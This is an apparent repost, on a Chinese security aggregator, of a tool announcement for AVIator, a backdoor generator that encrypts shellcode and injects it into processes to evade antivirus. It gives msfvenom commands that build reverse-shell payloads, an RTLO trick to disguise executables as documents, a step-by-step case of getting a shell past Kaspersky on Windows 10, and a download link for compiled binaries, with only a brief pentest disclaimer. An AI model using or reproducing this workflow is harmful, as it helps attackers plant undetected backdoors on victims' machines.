---
title: AVIator - Antivirus Evasion Project
url: https://buaq.net/go-145629.html
source: unSafe.sh - 不安全
date: 2023-01-16
fetch_date: 2025-10-04T03:58:42.782809
---

# AVIator - Antivirus Evasion Project

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/4ebe499f79e2e374472cbb045b46d946.jpg)

AVIator - Antivirus Evasion Project

AviAtor Ported to NETCore 5 with an updated UI About://name AV: AntiVirus Ator: Is a swor
*2023-1-15 19:30:0
Author: [www.kitploit.com(查看原文)](/jump-145629.htm)
阅读量:48
收藏*

---

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjXYfvBTvGCWFKO5zNeDScgv_KWPexghau5AwbfU4w0e7ii2tvf0T-KgJLx9BnB0-5QqtUMdGGGIWwmiLQc09RD4mOHUzJR3UFM6n5PMXQwzq26Qgm-gMrZG2Qvol_k_lUoFv4dWRn0J41UAlDQrO0ZauEr4TCzGYFrLXytvlvdwIcXX6MjVl4c9vexSQ=w640-h454)](https://blogger.googleusercontent.com/img/a/AVvXsEjXYfvBTvGCWFKO5zNeDScgv_KWPexghau5AwbfU4w0e7ii2tvf0T-KgJLx9BnB0-5QqtUMdGGGIWwmiLQc09RD4mOHUzJR3UFM6n5PMXQwzq26Qgm-gMrZG2Qvol_k_lUoFv4dWRn0J41UAlDQrO0ZauEr4TCzGYFrLXytvlvdwIcXX6MjVl4c9vexSQ)

AviAtor Ported to NETCore 5 with an updated UI

**About**://name

***AV**: AntiVirus*

***Ator**: Is a swordsman, alchemist, scientist, magician, scholar, and engineer, with the ability to sometimes produce objects out of thin air* ([https://en.wikipedia.org/wiki/Ator](https://en.wikipedia.org/wiki/Ator "https://en.wikipedia.org/wiki/Ator"))

**About**://purpose

**AV|Ator** is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. More specifically:

* It uses AES [encryption](https://www.kitploit.com/search/label/Encryption "encryption") in order to encrypt a given shellcode
* Generates an executable file which contains the encrypted payload
* The shellcode is decrypted and injected to the target system using various injection techniques

[[https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/ "https://attack.mitre.org/techniques/T1055/")]:

1. Portable executable injection which involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue.
2. Thread execution hijacking which involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.

### Usage

The application has a form which consists of three main inputs (See [screenshot](https://www.kitploit.com/search/label/Screenshot "screenshot") bellow):

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiJdMuQObLrzYAnwDaWTP7dLPu1AFpBWWU-6U-rRgdudyVVLP72PwOFv29Qc55JdkC2mDGPGPD1gD6qkd6ycfDm8nqDT1cmnK8Z8YRQKgJorm75KHUz1536LqHI-dyQcWt238j4DXP5jr8xu7-sB22f9rPTSDvq-BvOdOGJ-zKmssQGeil99QPRBIyFug=w640-h488)](https://blogger.googleusercontent.com/img/a/AVvXsEiJdMuQObLrzYAnwDaWTP7dLPu1AFpBWWU-6U-rRgdudyVVLP72PwOFv29Qc55JdkC2mDGPGPD1gD6qkd6ycfDm8nqDT1cmnK8Z8YRQKgJorm75KHUz1536LqHI-dyQcWt238j4DXP5jr8xu7-sB22f9rPTSDvq-BvOdOGJ-zKmssQGeil99QPRBIyFug)

1. A text containing the encryption key used to encrypt the shellcode
2. A text containing the IV used for AES encryption
3. A text containing the shellcode

Important note: The shellcode should be provided as a C# byte array.

The default values contain shellcode that executes notepad.exe (32bit). This demo is provided as an indication of how the code should be formed (using msfvenom, this can be easily done with the -f csharp switch, e.g. msfvenom -p windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=XXXX -f csharp).

After filling the provided inputs and selecting the output path an executable is generated according to the chosen options.

### RTLO option

In simple words, spoof an executable file to look like having an "innocent" extention like 'pdf', 'txt' etc. E.g. the file "testcod.exe" will be interpreted as "tesexe.doc"

Beware of the fact that some AVs alert the spoof by its own as a malware.

### Set custom icon

I guess you all know what it is :)

### Bypassing Kaspersky AV on a Win 10 x64 host (TEST CASE)

Getting a shell in a windows 10 machine running fully updated kaspersky AV

#### Target Machine: Windows 10 x64

1. Create the payload using msfvenom

   `msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp`
2. Use AVIator with the following settings

   Target OS architecture: x64

   Injection Technique: Thread Hijacking (Shellcode Arch: x64, OS arch: x64)

   Target procedure: explorer (leave the default)
3. Set the listener on the attacker machine
4. Run the generated exe on the victim machine

### Installation

**Windows:**

Either compile the project or download the allready compiled executable from the following folder:

[https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries](https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries "https://github.com/Ch0pin/AVIator/tree/master/Compiled%20Binaries")

**Linux:**

Install Mono according to your linux distribution, download and run the binaries

e.g. in kali:

### Credits

To Damon Mohammadbagher for the encryption procedure

### Disclaimer

I developed this app in order to overcome the demanding challenges of the pentest process and this is the **ONLY WAY** that this app should be used. Make sure that you have the required permission to use it against a system and never use it for illegal purposes.

文章来源: http://www.kitploit.com/2023/01/aviator-antivirus-evasion-project.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)